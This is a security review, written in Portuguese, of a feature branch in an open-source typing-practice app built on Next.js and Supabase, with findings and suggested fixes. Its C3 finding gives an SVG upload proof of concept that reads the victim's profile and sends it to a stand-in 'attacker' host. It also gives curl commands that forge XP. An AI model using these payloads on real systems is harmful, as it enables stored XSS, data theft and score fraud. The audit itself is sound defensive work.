# Security Review — Sprint Social + Gamificação

**Branch revisada:** `feature/sprint-social-gamificacao`
**Data:** 2026-05-21
**Escopo:** APIs novas, migrations RLS, upload de avatar, sistema de follow/feed.
**Premissa-chave:** projeto é **open source** → ter o schema do DB público é OK *desde que* RLS esteja correta. Toda a segurança depende de RLS + validação no backend.

---

## TL;DR

| Severidade | Quantidade | Status |
|------------|-----------:|--------|
| 🚨 Crítico | 5 | Não corrigido |
| 🔴 Alto    | 4 | Não corrigido |
| 🟡 Médio   | 3 | Não corrigido |
| 🟢 Baixo   | 2 | Não corrigido |

**Recomendação**: corrigir os 5 críticos antes de mergear em `master`. Os Altos/Médios podem ir em PRs separados.

---

## 🚨 CRÍTICO

### C1 — Forjar WPM/XP arbitrário via `/api/progress/session`
**Arquivo:** [`app/api/progress/session/route.ts:7-20`](../app/api/progress/session/route.ts)

**Vulnerabilidade:** o type guard `isSessionInput` valida apenas **tipos**, não **ranges**. Atacante autenticado envia:

```bash
curl -X POST https://app/api/progress/session \
  -H "Content-Type: application/json" \
  -H "Cookie: sb-access-token=<token>" \
  -d '{"languageId":"javascript","snippetId":"js-001","wpm":99999,"accuracy":100,"errors":0,"duration":1,"difficulty":"hard"}'
```

Resultado: `xpEarned = (10 + 9999 + 10) * 2 + 5 = 20043 XP por sessão`. Domina leaderboard, quebra gamificação, dispara achievements indevidos.

**Impacto:** alto. Leaderboard fica inutilizável, conquistas perdem valor.

**Fix sugerido:**
```ts
function isValidSessionInput(input: SessionInput): boolean {
  return (
    input.wpm >= 0 && input.wpm <= 250 &&        // 250wpm = top 0.01% humano
    input.accuracy >= 0 && input.accuracy <= 100 &&
    input.errors >= 0 && input.errors <= 10000 &&
    input.duration >= 1 && input.duration <= 600 && // 10 min max
    ['easy', 'medium', 'hard'].includes(input.difficulty) &&
    isKnownLanguage(input.languageId) &&           // checa data/manifest.ts
    isKnownSnippet(input.languageId, input.snippetId)
  )
}
```

Além disso, validar **proporção**: `wpm` realista vs `duration` (ex: 200 WPM em 1s não digita os 50+ chars necessários).

---

### C2 — `/api/progress/import` permite sobrescrever progresso com payload arbitrário
**Arquivo:** [`app/api/progress/import/route.ts:23-52`](../app/api/progress/import/route.ts)

**Vulnerabilidade:** `normalizeProgressInput` valida estrutura mas não valida valores. Body `{"progress":{"totalXP":9999999,"streak":{"current":999}}}` é aceito e gravado via `replaceRemoteProgress` (DELETE + INSERT). Se `profile.localImportedAt` for `null` (primeira vez), atacante sobe pra top do leaderboard.

**Vetor combinado**: usuário se cadastra → ANTES da primeira sessão → manda `/import` com payload forjado → vira top 1.

**Fix sugerido:**
- Validar mesmas regras de C1 dentro de `normalizeProgressInput`.
- Limitar `totalXP` a soma plausível das `history`.
- Limitar `history.length` (atualmente já cortado em `MAX_HISTORY=50` em [`lib/gamification.ts:34`](../lib/gamification.ts)).
- Travar `/import` pra **sempre** verificar se `profile.totalXP > 0` (já tem progresso remoto) e rejeitar.

---

### C3 — Avatar upload aceita SVG/HTML como "JPEG" (XSS stored)
**Arquivo:** [`app/api/me/avatar/route.ts:31`](../app/api/me/avatar/route.ts)

**Vulnerabilidade:** valida apenas `file.type` (Content-Type enviado pelo client, manipulável). Atacante:

```js
const blob = new Blob([
  '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(`/api/me/profile`).then(r=>r.json()).then(d=>fetch(`//attacker/?d=${btoa(JSON.stringify(d))}`))">'
], { type: 'image/jpeg' }) // mentindo o type
const fd = new FormData()
fd.append('file', new File([blob], 'pwn.jpg', { type: 'image/jpeg' }))
fetch('/api/me/avatar', { method: 'POST', body: fd })
```

O Supabase Storage aceita, salva como `<uid>/avatar.jpg` mas o conteúdo é SVG executável. Quando renderizado como `<img>`, browsers não executam scripts em `<img src=*.svg>` (bom), MAS:
- Se servido com `Content-Type: image/svg+xml` (que o Supabase **pode** inferir do conteúdo), e linkado com `<object>` ou `<iframe>`, executa.
- Se a vítima abre o URL direto no browser, executa.

**Combinado com C5** (bucket público), qualquer um pode acessar o payload.

**Fix sugerido:**
1. **Ler magic bytes** dos primeiros 4-12 bytes do `arrayBuffer`:
   ```ts
   const bytes = new Uint8Array(arrayBuffer.slice(0, 12))
   const isJPEG = bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF
   const isPNG = bytes[0] === 0x89 && bytes[1] === 0x50 && bytes[2] === 0x4E && bytes[3] === 0x47
   const isWebP = bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50
   if (!isJPEG && !isPNG && !isWebP) return error415
   ```
2. **Setar `Content-Disposition: attachment`** ou Content-Type force-image no upload.
3. **Remover SVG da whitelist explicitamente** (já está fora, mas C3 ataca por bypass).
4. Considerar processar a imagem server-side (sharp/imagemagick) pra normalizar — qualquer SVG falha o decode.

---

### C4 — Error messages vazam estrutura interna do banco
**Arquivos:**
- [`app/api/profile/[username]/route.ts:28`](../app/api/profile/[username]/route.ts)
- [`app/api/me/avatar/route.ts:49,62`](../app/api/me/avatar/route.ts)
- [`app/api/me/follow/[username]/route.ts:24,42,60`](../app/api/me/follow/[username]/route.ts)
- [`app/api/feed/route.ts:27`](../app/api/feed/route.ts)
- [`app/api/progress/session/route.ts:49`](../app/api/progress/session/route.ts)
- [`app/api/progress/import/route.ts:48`](../app/api/progress/import/route.ts)

**Vulnerabilidade:** `NextResponse.json({ error: err.message })` repassa a mensagem do Supabase/Postgres direto. Atacante envia payloads malformados e mapeia:
- Nomes de tabelas (`relation "user_progress" does not exist`)
- Constraints (`violates check constraint "follows_check"`)
- Tipos esperados (`invalid input syntax for type uuid`)
- Policies de RLS (`new row violates row-level security policy "Users can follow others"`)

**Fix sugerido:**
```ts
function safeErrorResponse(err: unknown, fallback: string, status = 500) {
  console.error('[api]', err) // log interno detalhado
  return NextResponse.json({ error: fallback }, { status })
}

// uso:
catch (err) {
  return safeErrorResponse(err, 'Could not load profile.', 500)
}
```

Mensagens públicas devem ser **genéricas e seguras**: `"Could not save session"`, `"Profile not found"`, etc. Stack traces e detalhes vão pro `console.error` (visíveis no Vercel logs, não no client).

---

### C5 — Bucket `avatars` totalmente público (combinado com C3)
**Arquivo:** [`supabase/migrations/002_storage_avatars.sql:5-7`](../supabase/migrations/002_storage_avatars.sql)

**Vulnerabilidade:** `public: true` no bucket — qualquer pessoa lê `https://<project>.supabase.co/storage/v1/object/public/avatars/<qualquer_uid>/avatar.jpg` sem autenticação. Sozinho é OK (avatares devem ser públicos). Combinado com C3 vira XSS distribuído.

**Fix sugerido:**
- Manter público (UX precisa).
- **Adicionar transformação server-side** via Supabase Image Transformation: `?width=200&height=200&resize=cover` força redecodificação que neutraliza payloads SVG/HTML.
- Setar `Cache-Control: public, max-age=3600` no upload (já tem, OK).
- Setar header `Content-Disposition: inline; filename="avatar.jpg"` força browser a tratar como download em vez de renderizar.

---

## 🔴 ALTO

### A1 — Função SQL sem `SECURITY INVOKER`
**Arquivo:** [`supabase/migrations/003_leaderboard_score_view.sql:6-19`](../supabase/migrations/003_leaderboard_score_view.sql)

`CREATE OR REPLACE FUNCTION compute_level` sem cláusula `SECURITY INVOKER` herda permissões do criador (geralmente superuser). Não é exploitable hoje (função é pura), mas antipattern: se um dia ela tocar tabelas, herda acesso indevido. Fix:
```sql
CREATE OR REPLACE FUNCTION compute_level(xp INT) RETURNS INT
SECURITY INVOKER  -- ← adicionar
LANGUAGE plpgsql IMMUTABLE AS $$ ... $$;
```

---

### A2 — Sem rate limit em `/api/progress/session`
**Impacto:** combinado com C1, atacante manda 100 sessões/segundo, cada uma com `wpm=250`. Floods o leaderboard e o feed.

**Fix sugerido:** middleware com Upstash Redis ou `@vercel/kv`:
```ts
const ratelimit = new Ratelimit({ redis, limiter: Ratelimit.slidingWindow(20, '1 m') })
const { success } = await ratelimit.limit(user.id)
if (!success) return NextResponse.json({ error: 'Rate limited.' }, { status: 429 })
```

20 sessões/min é folgado pra uso real (uma sessão dura 30-120s).

---

### A3 — Sem rate limit em `/api/me/follow/[username]`
**Impacto:** follow-spam (10k follows em segundos). Quebra contadores, espama notificações no futuro.

**Fix:** mesmo padrão do A2, com `Ratelimit.slidingWindow(30, '1 m')`.

---

### A4 — Avatar URL com timestamp leaks última-atualização
**Arquivo:** [`app/api/me/avatar/route.ts:54`](../app/api/me/avatar/route.ts)

`?v=${Date.now()}` é salvo em `profiles.avatar_url`. `/api/profile/[username]` retorna isso publicamente → qualquer um sabe quando você atualizou avatar pela última vez. Minor info leak.

**Fix:** usar um hash do conteúdo em vez de timestamp:
```ts
const hash = crypto.createHash('sha256').update(arrayBuffer).digest('hex').slice(0, 8)
const avatarUrl = `${publicUrl}?v=${hash}`
```

---

## 🟡 MÉDIO

### M1 — `app/api/feed` retorna erros como HTTP 200
**Arquivo:** [`app/api/feed/route.ts:27`](../app/api/feed/route.ts)

`return NextResponse.json({ events: [], scope, error: ... })` sem `{ status: 500 }`. Cliente trata como sucesso. Não vulnerabilidade direta, mas mascara problemas reais.

**Fix:** adicionar `, { status: 500 }`.

---

### M2 — Campo `avatarUrl` aceita qualquer string via `/api/me/profile` PATCH
**Arquivo:** [`app/api/me/profile/route.ts:52`](../app/api/me/profile/route.ts)

Body `{avatarUrl: "javascript:alert(1)"}` é aceito e salvo. Browsers bloqueiam `javascript:` em `<img>`, mas:
- `data:` URLs grandes podem ser usadas pra inflar payload.
- URLs externas podem apontar pra trackers, IPs internos (SSRF via referer).

**Fix:**
```ts
function isValidAvatarUrl(url: string): boolean {
  if (url === '' || url === null) return true
  try {
    const u = new URL(url)
    return ['http:', 'https:'].includes(u.protocol)
  } catch { return false }
}
```

---

### M3 — Modo `lenient` (a11y) combinado com C1 amplifica forja
**Arquivo:** [`hooks/useTypingEngine.ts:239`](../hooks/useTypingEngine.ts)

Lenient marca **todas** as teclas como corretas → accuracy fica 100% sem digitar nada certo. Sozinho é só má UX em leaderboard, mas se C1 não for fixado, atacante combina os dois pra forjar perfis "perfeitos".

**Fix:** marcar sessões em modo lenient com flag (`session.lenient: true`) e **excluir do leaderboard/achievements**.

---

## 🟢 BAIXO

### B1 — `console.warn` em produção em [`lib/schemas.ts:50,57,64`](../lib/schemas.ts)
Em prod, leaka detalhes de validação de snippets no console do browser. Não exploitable.

**Fix:** guard com `if (typeof window !== 'undefined' && process.env.NODE_ENV === 'development')`.

---

### B2 — `ilike` em username permite squatting por casing
**Arquivo:** [`lib/server/profile-store.ts:42`](../lib/server/profile-store.ts)

`ilike('username', username)` resolve case-insensitive → `Vini`, `VINI`, `vini` levam ao mesmo perfil. Como `lib/usernames.ts` valida lowercase-only, isso só vira problema se a constraint UNIQUE no DB não for case-insensitive.

**Fix:** garantir migration `CREATE UNIQUE INDEX profiles_username_lower_unique ON profiles (lower(username))` — versão mais forte da migration 001.

---

## Mitigações já presentes (bom estado)

- ✅ Auth check (`supabase.auth.getUser()`) em todas as rotas mutativas.
- ✅ RLS habilitada em todas as tabelas novas (`achievements`, `user_achievements`, `follows`, `feed_events`).
- ✅ RLS de `follows` impede usuário criar follows com `follower_id ≠ auth.uid()`.
- ✅ `feed_events` INSERT só via service-role backend (sem `WITH CHECK`).
- ✅ Zero uso de `SUPABASE_SERVICE_ROLE_KEY` no client (procurei, não tem).
- ✅ Validação client-side de tipo de arquivo (não confiável mas reduz acidentes).
- ✅ Constraint `CHECK (follower_id <> following_id)` impede auto-follow.
- ✅ Path do avatar usa `auth.uid()` (RLS de Storage casa com pasta).
- ✅ Zod schemas em [`lib/schemas.ts`](../lib/schemas.ts) pra snippets de boot (validação build-time).
- ✅ Type guard em `/api/progress/session` rejeita estrutura inválida.
- ✅ `SessionRecord` history limitada em 50 (`MAX_HISTORY`).

---

## Outras observações (não-vulnerabilidades)

- **Migrations no repo público são OK.** Schema visível ajuda contribuidores e auditoria. O DB é protegido por RLS + service role, não por obscuridade.
- **`.env.example` está correto** — só vars NEXT_PUBLIC_ que viram bundle do browser de qualquer jeito.
- **`lib/supabase/env.ts`** trata env ausente gracefully (não trava o build).
- **Lock files**: agora só `package-lock.json` (npm puro), `pnpm-lock.yaml` foi removido. OK.

---

## Roadmap sugerido de fix

| Fase | Itens | Tempo estimado |
|------|-------|----------------|
| **PR #1 — pré-merge obrigatório** | C1, C2, C3, C4, C5 | 1-2h |
| **PR #2 — hardening** | A1, A2, A3, A4 | 2-3h |
| **PR #3 — polimento** | M1, M2, M3, B1, B2 | 1-2h |
| **PR #4 — observabilidade** | Adicionar logging estruturado de auth fails, rate-limit hits, validation errors | 2-4h |

---

## Como reproduzir cada finding

Cada finding crítico inclui o vetor de ataque acima. Pra validar fixes:

```bash
# C1 — Forjar WPM
curl -X POST 'http://localhost:3000/api/progress/session' \
  -H 'Cookie: <auth>' -H 'Content-Type: application/json' \
  -d '{"languageId":"javascript","snippetId":"js-001","wpm":99999,"accuracy":100,"errors":0,"duration":1,"difficulty":"hard"}'
# Esperado pos-fix: 400 com "Invalid session payload"

# C3 — SVG como JPEG
# Ver bloco no item C3

# C4 — Vazamento de erro
curl 'http://localhost:3000/api/profile/<<<>>>'  # username invalido
# Esperado pos-fix: 400 generico, sem mencionar tabela/coluna
```

---

## Conclusão

O projeto **não está exposto pelo schema ser público**. O risco está em:
1. **Validação insuficiente de input** (C1, C2, M2)
2. **Upload sem magic-byte check** (C3)
3. **Error messages verbosos** (C4)
4. **Falta de rate limiting** (A2, A3)

Tudo é corrigível. Prioridade alta: C1+C4 — são os mais explorados na prática.
